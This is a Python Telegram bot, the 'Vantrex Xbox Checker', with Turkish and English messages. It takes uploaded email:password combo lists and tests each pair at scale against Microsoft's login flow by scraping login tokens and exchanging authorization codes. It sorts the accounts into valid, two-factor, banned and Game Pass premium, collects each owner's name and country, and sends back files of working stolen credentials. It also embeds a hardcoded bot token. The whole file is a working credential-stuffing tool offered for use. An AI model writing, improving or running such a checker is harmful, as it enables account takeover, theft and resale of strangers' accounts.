#!/usr/bin/env python3
"""
VANTREX XBOX CHECKER BOT - PREMIUM FIXED (FINAL)
"""

import os, re, time, json, uuid, logging, threading
from urllib.parse import quote
import concurrent.futures

try:
    import requests
    import telebot
    from telebot import types
except ImportError:
    os.system("pip install requests pyTelegramBotAPI")
    import requests
    import telebot
    from telebot import types

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ⚠️ BURAYA KENDİ TOKEN'INI YAZ
TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
bot = telebot.TeleBot(TOKEN)

# ===================== DİL DESTEĞİ =====================
LANGUAGES = {
    'en': {
        'welcome': "🔥 **Welcome to Vantrex Xbox Checker Bot!**\n\nSelect your language and upload a `.txt` combo file.",
        'already_running': "❌ A scan is already running.",
        'invalid_file': "❌ Please send only `.txt` files.",
        'read_error': "❌ File read error: ",
        'no_combo': "❌ No valid `email:password` found.",
        'preparing': "⏳ Starting scan...",
        'stopped_msg': "⏹ Scan stopped. Preparing output...",
        'not_running': "❌ No active scan.",
        'live_title': "🤖 **Vantrex Bot — Live Results**",
        'progress': "Progress",
        'duration': "Duration",
        'stop_hint': "Type /stop to abort.",
        'final_hit': "🏁 **Scanning Completed!**",
        'interrupted_title': "🛑 **Scanning Interrupted!**",
        'total_scanned': "Total Scanned",
        'hits_caption': "🟢 Valid Accounts (Hits)",
        'premium_caption': "👑 Premium Accounts",
        'rem_caption': "📦 Remaining Combos",
        'lang_changed': "✅ Language set to English!"
    },
    'tr': {
        'welcome': "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nDil seçin ve `.txt` combo dosyası gönderin.",
        'already_running': "❌ Zaten bir tarama çalışıyor.",
        'invalid_file': "❌ Sadece `.txt` dosyası gönderin.",
        'read_error': "❌ Dosya okuma hatası: ",
        'no_combo': "❌ Geçerli `email:password` bulunamadı.",
        'preparing': "⏳ Tarama başlatılıyor...",
        'stopped_msg': "⏹ Tarama durduruldu. Çıktı hazırlanıyor...",
        'not_running': "❌ Aktif tarama yok.",
        'live_title': "🤖 **Vantrex Bot — Canlı Sonuçlar**",
        'progress': "İlerleme",
        'duration': "Süre",
        'stop_hint': "Durdurmak için /stop yazın.",
        'final_hit': "🏁 **Tarama Tamamlandı!**",
        'interrupted_title': "🛑 **Tarama Durduruldu!**",
        'total_scanned': "Toplam taranan",
        'hits_caption': "🟢 Geçerli Hesaplar",
        'premium_caption': "👑 Premium Hesaplar",
        'rem_caption': "📦 Kalan Kombolar",
        'lang_changed': "✅ Dil Türkçe olarak ayarlandı!"
    }
}

user_languages = {}

def get_text(chat_id, key):
    lang = user_languages.get(chat_id, 'en')
    return LANGUAGES[lang].get(key, LANGUAGES['en'][key])

# ===================== SESSION =====================
class BotSession:
    def __init__(self):
        self.is_running = False
        self.combos = []
        self.remaining_combos = []
        self.processed = 0
        self.total = 0
        self.hits = 0
        self.premium = 0
        self.bad = 0
        self.two_factor = 0
        self.banned = 0
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        self.hit_results = []
        self.premium_results = []

session = BotSession()

# ===================== XBOX CHECKER (PREMIUM FIX) =====================
class XboxChecker:
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def check_premium(self, req_session, access_token, cid):
        """3 farklı premium URL'sini sırayla dener, çalışanı kullanır."""
        premium_urls = [
            "https://purchase.mp.microsoft.com/v8.0/b2b/recurrences/query",
            "https://user.msp.mp.microsoft.com/v8.0/collections/query?itemTypes=Game",
            "https://catalog.gamepass.com/sigls/v2"
        ]

        for url in premium_urls:
            try:
                headers = {
                    "User-Agent": self.user_agent,
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Accept": "application/json"
                }
                r = req_session.get(url, headers=headers, timeout=10)
                if r.status_code != 200:
                    continue

                data = r.json()
                items = data.get("items") or data.get("subscriptions") or data.get("recurrences") or []
                for item in items:
                    status = item.get("status", "")
                    if status.lower() != "active":
                        continue
                    product = item.get("product", {})
                    pid = product.get("productId", "").lower()
                    name = product.get("displayName") or product.get("localizedDisplayName", "")
                    if any(x in pid for x in ["gamepass", "ultimate", "gold", "ea"]) or \
                       any(x in name.lower() for x in ["game pass", "ultimate", "gold", "ea play"]):
                        return True, name or "Premium"
                return False, "None"
            except:
                continue
        return False, "None"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # Step 1: IDP
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text or "Neither" in r1.text:
                return {"status": "BAD", "data": {}}

            # Step 2: Authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Login
            login_data = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
            }
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)

            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                return {"status": "BAD", "data": {}}
            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "Abuse" in r3.text or "acc_banned" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            mspcid = req_session.cookies.get("MSPCID", "") or ""
            cid = mspcid.upper()

            # Step 4: Access Token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            access_token = r4.json()["access_token"]

            # Step 5: Profile
            country, name = "N/A", "Xbox User"
            try:
                profile_headers = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}"
                }
                r5 = req_session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "N/A")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass

            # Step 6: PREMIUM CHECK (FIXED - multiple URLs)
            is_premium, detected_plan = self.check_premium(req_session, access_token, cid)

            capture_data = {"country": country, "name": name, "plan": detected_plan}
            if is_premium:
                return {"status": "PREMIUM", "data": capture_data}
            else:
                return {"status": "HIT", "data": capture_data}

        except Exception:
            return {"status": "TIMEOUT", "data": {}}

# ===================== BOT HELPERS =====================
def build_live_text(chat_id):
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    return (
        f"🤖 **{get_text(chat_id, 'live_title')}**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{get_text(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **{get_text(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"👑 **Premium:** `{session.premium}`\n"
        f"🟢 **Hits:** `{session.hits}`\n"
        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 {get_text(chat_id, 'stop_hint')}"
    )

def update_telegram_loop():
    last_processed = -1
    while session.is_running:
        time.sleep(4)
        if session.processed != last_processed:
            try:
                bot.edit_message_text(
                    build_live_text(session.chat_id),
                    chat_id=session.chat_id,
                    message_id=session.status_msg_id,
                    parse_mode="Markdown"
                )
                last_processed = session.processed
            except:
                pass

def process_combo(combo):
    if not session.is_running:
        return
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    checker = XboxChecker()
    res = checker.check(email, password)
    status = res.get("status", "BAD")
    data = res.get("data", {})

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)

        if status == "PREMIUM":
            session.premium += 1
            line = f"{email}:{password} | Sub: {data.get('plan','Active')} | Name: {data.get('name','Xbox User')} | Country: {data.get('country','N/A')}"
            session.premium_results.append(line)
        elif status == "HIT":
            session.hits += 1
            line = f"{email}:{password} | Name: {data.get('name','Xbox User')} | Country: {data.get('country','N/A')}"
            session.hit_results.append(line)
        elif status == "2FACTOR":
            session.two_factor += 1
        elif status == "BANNED":
            session.banned += 1
        else:
            session.bad += 1

def send_final_report(interrupted=False):
    cid = session.chat_id
    status_str = get_text(cid, 'interrupted_title') if interrupted else get_text(cid, 'final_hit')
    elapsed = time.time() - session.start_time
    summary = (
        f"{status_str}\n━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{get_text(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
        f"⏱ **{get_text(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"👑 **Premium:** `{session.premium}`\n"
        f"🟢 **Hits:** `{session.hits}`\n"
        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
    )
    bot.send_message(cid, summary, parse_mode="Markdown")

    if session.premium_results:
        fn = "Vantrex-Premium.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.premium_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=get_text(cid, 'premium_caption'))
        os.remove(fn)

    if session.hit_results:
        fn = "Vantrex-Hits.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=get_text(cid, 'hits_caption'))
        os.remove(fn)

    if interrupted and session.remaining_combos:
        fn = "Vantrex-Remaining.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=get_text(cid, 'rem_caption'))
        os.remove(fn)

# ===================== TELEGRAM HANDLERS =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    if cid not in user_languages:
        user_languages[cid] = 'en'
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
    markup.add(btn_en, btn_tr)
    bot.send_message(cid, get_text(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_callback(call):
    cid = call.message.chat.id
    lang_code = call.data.split('_')[1]
    user_languages[cid] = lang_code
    bot.answer_callback_query(call.id, text=get_text(cid, 'lang_changed'))
    bot.edit_message_text(get_text(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    cid = message.chat.id
    if not session.is_running:
        bot.reply_to(message, get_text(cid, 'not_running'))
        return
    bot.reply_to(message, get_text(cid, 'stopped_msg'))
    session.is_running = False
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
    send_final_report(interrupted=True)

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    global session
    cid = message.chat.id
    if session.is_running:
        bot.reply_to(message, get_text(cid, 'already_running'))
        return
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, get_text(cid, 'invalid_file'))
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"{get_text(cid, 'read_error')}{str(e)}")
        return

    if not combos:
        bot.reply_to(message, get_text(cid, 'no_combo'))
        return

    session = BotSession()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = cid
    session.start_time = time.time()

    msg = bot.send_message(cid, get_text(cid, 'preparing'), parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    threading.Thread(target=update_telegram_loop, daemon=True).start()

    def run_pool():
        with concurrent.futures.ThreadPoolExecutor(max_workers=85) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

# ===================== MAIN =====================
if __name__ == "__main__":
    print("[+] Vantrex Bot (Premium Fixed) started. Press Ctrl+C to stop.")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
